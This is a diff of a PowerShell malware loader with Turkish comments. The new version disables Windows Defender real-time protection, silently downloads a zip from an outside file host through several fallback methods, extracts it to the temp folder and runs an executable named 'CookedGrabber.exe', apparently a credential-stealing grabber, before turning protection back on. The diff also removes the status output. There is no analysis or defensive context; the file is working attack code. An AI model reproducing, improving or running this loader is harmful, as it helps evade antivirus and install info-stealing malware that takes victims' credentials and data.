@@ -1,15 +1,17 @@
+# Gerçek zamanlı korumayı geçici olarak devre dışı bırak
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 $zipUrl = "https://phs8.krakencloud.net/force-download/YTVlZDUyNmFjMjM0ODljMEdJkIYYNXKlh90AQUmTDQePnkgZwCY0DknElozHjF3N/nhRWBTtepD"
 $zipPath = "$env:TEMP\bot.zip"
 $extractPath = "$env:TEMP\cikartilan"
 $exeName = "CookedGrabber.exe"
 
-# Eski kalıntıları temizle
+# Önceki dosyaları temizle
 Remove-Item $zipPath -ErrorAction SilentlyContinue
 Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
 
 function Try-ExtractZip {
     param ($path)
-
     try {
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $path)
@@ -19,88 +21,32 @@ function Try-ExtractZip {
     }
 }
 
-function Try-Extract7Zip {
-    param ($path)
-    $sevenZip = "C:\Program Files\7-Zip\7z.exe"
-    if (Test-Path $sevenZip) {
-        try {
-            Start-Process -FilePath $sevenZip -ArgumentList "x `"$zipPath`" -o`"$path`" -y" -Wait
-            return $true
-        } catch {
-            return $false
-        }
-    }
-    return $false
-}
-
-function Try-ExtractShellApp {
-    param ($path)
+# ZIP dosyasını indirmeyi dene (sessizce)
+try {
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
+} catch {
     try {
-        $shell = New-Object -ComObject shell.application
-        $zip = $shell.NameSpace($zipPath)
-        $dest = $shell.NameSpace($path)
-        $dest.CopyHere($zip.Items(), 16)
-        Start-Sleep -Seconds 3
-        return $true
-    } catch {
-        return $false
-    }
-}
-
-function Try-Download {
-    try {
-        Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
-        return (Test-Path $zipPath)
+        Start-BitsTransfer -Source $zipUrl -Destination $zipPath
     } catch {
         try {
-            Start-BitsTransfer -Source $zipUrl -Destination $zipPath
-            return (Test-Path $zipPath)
-        } catch {
-            try {
-                curl.exe -L $zipUrl -o $zipPath
-                return (Test-Path $zipPath)
-            } catch {
-                return $false
-            }
-        }
+            curl.exe -L $zipUrl -o $zipPath
+        } catch { }
     }
 }
 
-function Try-RunExe {
-    param ($folder, $exe)
-    $exePath = Join-Path $folder $exe
-    if (Test-Path $exePath) {
-        Start-Process -FilePath $exePath
-        return $true
-    }
-    return $false
-}
-
-# 🔥 BAŞLAAAAAA
-if (Try-Download) {
+# Eğer ZIP varsa, çıkar ve çalıştır
+if (Test-Path $zipPath) {
     if (!(Test-Path $extractPath)) {
         New-Item -ItemType Directory -Path $extractPath | Out-Null
     }
 
-    $extracted = $false
-
-    $methods = @("Try-ExtractZip", "Try-Extract7Zip", "Try-ExtractShellApp")
-
-    foreach ($method in $methods) {
-        Write-Host "Deniyor: $method"
-        if (& $method $extractPath) {
-            $extracted = $true
-            break
+    if (Try-ExtractZip $extractPath) {
+        $exePath = Join-Path $extractPath $exeName
+        if (Test-Path $exePath) {
+            Start-Process -FilePath $exePath
         }
     }
-
-    if ($extracted) {
-        if (!(Try-RunExe $extractPath $exeName)) {
-            Write-Host "EXE bulunamadı veya çalışmadı. 💔"
-        }
-    } else {
-        Write-Host "Hiçbir çıkarma yöntemi işe yaramadı. ZIP BOK GİBİ. 💀"
-    }
-} else {
-    Write-Host "İndirme başarısız. 🙃"
 }
+
+# Gerçek zamanlı korumayı geri aç
+Set-MpPreference -DisableRealtimeMonitoring $false
